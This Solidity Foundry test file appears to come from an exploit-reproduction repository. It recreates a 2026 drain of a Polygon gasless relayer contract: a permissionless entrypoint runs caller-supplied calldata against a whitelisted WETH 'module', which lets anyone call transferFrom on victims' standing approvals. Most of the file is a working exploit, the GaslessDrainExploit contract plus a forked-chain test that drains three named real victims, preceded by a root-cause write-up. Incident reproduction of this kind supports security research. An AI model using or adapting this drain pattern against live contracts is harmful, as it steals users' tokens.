// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Gasless meta-transaction relayer drain — Polygon. GaslessReservoirEnabler exposes a permissionless
// entrypoint erc20WithTransfersAndExecute(ERC20Transfer[], ExecutionInfo[]). The ExecutionInfo leg lets
// the caller name a `module` and arbitrary `data`, and the contract runs module.call(data) after checking
// only that (a) the module is on moduleWhitelist and (b) the module is a contract. It never restricts what
// `data` may be. The live WETH token contract is itself whitelisted as a "module", so a caller can pass
// data = transferFrom(victim, attacker, amount): the enabler becomes msg.sender to WETH, and any address
// that had a standing WETH approval to the enabler is drained. No signature, no privileged role, no owner
// binding — the meta-transaction signature path (executeMetaTransaction) is bypassed entirely.
//
// Attack tx : 0x2e476745f0f546dbe4583359ea6258dfb4fababea08734f676df2e6006e1fdee (block 94199850)
// Attacker  : 0x46f54C1A86575679FC3d29666C1717E9786279Aa (via helper 0x26a3d1f2...)
// Enabler   : 0x9B58fDAdc16E30fBA313E044bf9e88689C3F163e (verified source; NOT a proxy)
// Token     : WETH 0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619 (whitelisted module)
// Loss      : 8.7199 WETH across 466 victims in this tx (~$23.8K at the fork-block WETH price), i.e. the
//             ~$23K reported. This PoC reproduces the 3 largest victims (2.3546 WETH, ~$6.4K, ~27% of the
//             WETH leg by value), which is sufficient per this repo's convention; matching all 466 is not.
//
// ROOT CAUSE — confirmed against the verified source, the tx trace, and direct on-chain reads:
//   1. erc20WithTransfersAndExecute is `external nonReentrant` with no auth. Its ExecutionInfo loop calls
//      _executeInternal, which does: require(moduleWhitelist[module]); require(module.isContract());
//      module.call{value}(data). The `data` is fully caller-controlled and unvalidated.
//   2. moduleWhitelist[WETH] == true at the fork block (direct read). A live ERC20 is a valid "module".
//   3. The attacker submits 466 ExecutionInfos, each {module: WETH, data: transferFrom(victim, helper,
//      amount), value: 0}. Decoded straight from the real calldata (see the drain() encoding below — it
//      rebuilds the same typed struct, no raw calldata blob is replayed).
//   4. Because the enabler is msg.sender to WETH, and every victim had granted a standing (near-max)
//      approval to the enabler, transferFrom(victim, helper, amount) succeeds. The `from` is pure caller
//      input with nothing binding it to msg.sender or to any signature. erc20sTransfers (which would pull
//      from _msgSender()) is left EMPTY; the whole drain runs through the whitelisted-module-call leg.
//
// This is a pure missing-authorization bug, callable by any address with zero setup — not a replay of a
// stolen off-chain signature or a relayer-key compromise. Verified at the parent block for all 3 victims
// reconstructed here: each holds exactly the drained WETH amount and carries a live max-ish allowance to
// the enabler.
//
// Run:
//   forge test --contracts src/test/2026-09/GaslessReservoirEnabler_exp.sol -vvv

address constant ENABLER = 0x9B58fDAdc16E30fBA313E044bf9e88689C3F163e;
address constant WETH = 0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619;
// UniV3 WETH/USDC.e 0.05% pool on Polygon: token0 = USDC.e (6dp), token1 = WETH (18dp). Read live at the
// fork block only to price the drained WETH in USD for the proportional-share assertion. No hardcoded price.
address constant WETH_USDC_POOL = 0x45dDa9cb7c25131DF268515131f647d726f50608;

// Real ABI of the vulnerable entrypoint, recovered from the verified source. Typed structs, not a blob.
struct ERC20Transfer {
    IERC20 token;
    uint256 amount;
}

struct ExecutionInfo {
    address module;
    bytes data;
    uint256 value;
}

interface IGaslessReservoirEnabler {
    function erc20WithTransfersAndExecute(
        ERC20Transfer[] calldata erc20sTransfers,
        ExecutionInfo[] calldata executionInfos
    ) external;
    function moduleWhitelist(address module) external view returns (bool);
    function hasRole(bytes32 role, address account) external view returns (bool);
}

interface IUniV3Pool {
    function slot0() external view returns (uint160 sqrtPriceX96, int24, uint16, uint16, uint16, uint8, bool);
}

contract GaslessReservoirEnabler_exp is Test {
    bytes32 constant DEFAULT_ADMIN_ROLE = 0x00;

    // Three representative (largest) victims from the real tx, and their exact drained WETH amounts.
    address[] internal victims;
    uint256[] internal amounts;

    GaslessDrainExploit internal exploit;

    function setUp() public {
        // Parent block of the exploit tx: real enabler config + real victim approvals/balances just before.
        vm.createSelectFork("polygon", 94_199_849);

        victims.push(0x2F785EF4f514F6b785Ab93062e05CfCC937faC96);
        amounts.push(836_325_335_838_961_283);
        victims.push(0xd7026A56F38962F224753Bb59c25abc7dD687884);
        amounts.push(767_721_189_811_708_090);
        victims.push(0x5eADDc6F18c0341C1680AD669BEe6896509F6A60);
        amounts.push(750_557_578_015_940_925);

        exploit = new GaslessDrainExploit();

        vm.label(ENABLER, "GaslessReservoirEnabler");
        vm.label(WETH, "WETH");
        vm.label(address(exploit), "Attacker");
    }

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public {
        IGaslessReservoirEnabler enabler = IGaslessReservoirEnabler(ENABLER);

        // CONFIRM the flawed config: a live ERC20 is whitelisted as an executable module. This is what
        // turns the unvalidated module.call(data) into an arbitrary transferFrom of any standing approval.
        assertTrue(enabler.moduleWhitelist(WETH), "WETH must be a whitelisted module (the misconfig)");

        // CONFIRM the attacker is unprivileged: no role, no signature, nothing. The drain path needs none.
        assertFalse(enabler.hasRole(DEFAULT_ADMIN_ROLE, address(exploit)), "attacker must hold no admin role");

        uint256 totalExpected;
        for (uint256 i = 0; i < victims.length; i++) {
            // These are the REAL preconditions on the fork: each victim already granted a standing approval
            // to the enabler and holds the WETH. Nothing is minted, dealt, or pranked — reality as-is.
            uint256 bal = IERC20(WETH).balanceOf(victims[i]);
            uint256 allow = IERC20(WETH).allowance(victims[i], ENABLER);
            assertGe(bal, amounts[i], "victim must hold the WETH to be drained");
            assertGe(allow, amounts[i], "victim must have a real standing approval to the enabler");
            totalExpected += amounts[i];
        }

        uint256 attackerBefore = IERC20(WETH).balanceOf(address(exploit));

        // Fire the real vulnerable entrypoint with typed structs: empty transfers + one ExecutionInfo per
        // victim, each {module: WETH, data: transferFrom(victim, attacker, amount)}.
        exploit.drain(ENABLER, WETH, victims, amounts);

        uint256 stolen = IERC20(WETH).balanceOf(address(exploit)) - attackerBefore;

        for (uint256 i = 0; i < victims.length; i++) {
            emit log_named_address("drained victim", victims[i]);
            emit log_named_decimal_uint("  WETH taken", amounts[i], 18);
        }
        emit log_named_decimal_uint("total WETH drained", stolen, 18);
        assertEq(stolen, totalExpected, "attacker must capture the victims' full WETH");

        // Proportional-share check. Price the drained WETH in USD from a live pool at the fork block, and
        // assert it is a material slice of the ~$23.8K WETH-leg total (this subset is ~27% by value).
        (uint160 sqrtP,,,,,,) = IUniV3Pool(WETH_USDC_POOL).slot0();
        // token0=USDC.e(6), token1=WETH(18): USDC per WETH = 2^192 * 1e12 / sqrtPriceX96^2.
        uint256 usdcPerWeth = ((uint256(2) ** 192) * 1e12) / (uint256(sqrtP) * uint256(sqrtP));
        uint256 usdStolen = (stolen * usdcPerWeth) / 1e18;
        emit log_named_uint("drained value (USD, approx)", usdStolen);
        assertGt(usdStolen, 3000, "reconstructed loss should be a material USD amount");
        assertLt(usdStolen, 12_000, "reconstructed subset should be a fair share, not the full incident");
    }
}

// Reconstruction of the attacker's batch driver. An ordinary, unprivileged contract: it builds one
// ExecutionInfo per victim and makes a single real typed call to the enabler. No signature, no role.
contract GaslessDrainExploit {
    address public immutable recipient;

    constructor() {
        recipient = address(this);
    }

    function drain(address enabler, address token, address[] calldata targets, uint256[] calldata amts) external {
        ExecutionInfo[] memory infos = new ExecutionInfo[](targets.length);
        for (uint256 i = 0; i < targets.length; i++) {
            // module = the whitelisted WETH token; data = a transferFrom pulling the victim's standing
            // approval to this contract. Built from typed args, exactly the shape decoded from the real tx.
            infos[i] = ExecutionInfo({
                module: token,
                data: abi.encodeWithSelector(IERC20.transferFrom.selector, targets[i], recipient, amts[i]),
                value: 0
            });
        }

        // erc20sTransfers left empty: the entire drain rides the unvalidated module-call leg.
        ERC20Transfer[] memory noTransfers = new ERC20Transfer[](0);
        IGaslessReservoirEnabler(enabler).erc20WithTransfersAndExecute(noTransfers, infos);
    }
}
